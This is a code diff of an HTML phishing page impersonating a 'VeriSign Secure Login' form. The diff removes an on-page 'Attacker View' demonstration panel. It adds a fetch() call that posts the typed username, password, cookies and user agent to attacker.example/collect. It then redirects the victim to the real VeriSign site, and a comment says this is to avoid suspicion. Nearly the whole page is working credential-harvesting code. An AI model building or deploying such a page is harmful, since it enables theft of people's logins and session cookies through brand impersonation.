@@ -3,7 +3,6 @@
 <head>
   <meta charset="UTF-8">
   <title>VeriSign Secure Login</title>
-
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -13,12 +12,6 @@
       align-items: center;
       height: 100vh;
     }
-
-    .wrapper {
-      display: flex;
-      gap: 50px;
-    }
-
     .login-box {
       background: white;
       padding: 30px;
@@ -26,31 +19,15 @@
       border-radius: 8px;
       box-shadow: 0 0 10px rgba(0,0,0,0.15);
     }
-
-    .attacker-box {
-      background: #fff5f5;
-      padding: 30px;
-      width: 360px;
-      border-radius: 8px;
-      border: 2px solid #d93025;
-      box-shadow: 0 0 10px rgba(0,0,0,0.15);
-    }
-
     h1 {
       text-align: center;
       margin-bottom: 10px;
     }
-
-    .attacker-box h1 {
-      color: #d93025;
-    }
-
     p {
       text-align: center;
       font-size: 13px;
       color: #666;
     }
-
     input {
       width: 100%;
       padding: 10px;
@@ -58,7 +35,6 @@
       border: 1px solid #ccc;
       border-radius: 5px;
     }
-
     button {
       width: 100%;
       padding: 10px;
@@ -68,45 +44,22 @@
       border-radius: 5px;
       cursor: pointer;
     }
-
     button:hover {
       background: #1558b0;
-    }
-
-    pre {
-      background: #f8f8f8;
-      padding: 10px;
-      border-radius: 5px;
-      font-size: 13px;
-      overflow-x: auto;
     }
   </style>
 </head>
 
 <body>
+  <div class="login-box">
+    <h1>VeriSign</h1>
+    <p>Secure Account Login</p>
 
-  <div class="wrapper">
-
-    <!-- Victim Login Panel -->
-    <div class="login-box">
-      <h1>VeriSign</h1>
-      <p>Secure Account Login</p>
-
-      <form onsubmit="stealCreds(event)">
-        <input type="text" id="user" placeholder="Username or Email" required>
-        <input type="password" id="pass" placeholder="Password" required>
-        <button type="submit">Login</button>
-      </form>
-    </div>
-
-    <!-- Attacker Panel (Separate) -->
-    <div class="attacker-box">
-      <h1>Attacker View</h1>
-      <pre id="output">
-Waiting for victim credentials...
-      </pre>
-    </div>
-
+    <form onsubmit="stealCreds(event)">
+      <input type="text" id="user" placeholder="Username or Email" required>
+      <input type="password" id="pass" placeholder="Password" required>
+      <button type="submit">Login</button>
+    </form>
   </div>
 
   <script>
@@ -116,20 +69,21 @@ Waiting for victim credentials...
       const username = document.getElementById("user").value;
       const password = document.getElementById("pass").value;
 
-      // Visible attacker impact
-      document.getElementById("output").textContent =
-        "Captured Credentials\n\n" +
-        "Username: " + username + "\n" +
-        "Password: " + password + "\n\n" +
-        "Cookies: " + document.cookie + "\n" +
-        "User-Agent: " + navigator.userAgent;
+      // Exfiltration to attacker-controlled endpoint
+      fetch("https://attacker.example/collect", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          username: username,
+          password: password,
+          cookies: document.cookie,
+          userAgent: navigator.userAgent
+        })
+      });
 
-      // Optional redirect for realism
-      setTimeout(() => {
-        window.location.href = "https://www.verisign.com/";
-      }, 3000);
+      // Redirect victim to legitimate site to avoid suspicion
+      window.location.href = "https://www.verisign.com/";
     }
   </script>
-
 </body>
 </html>
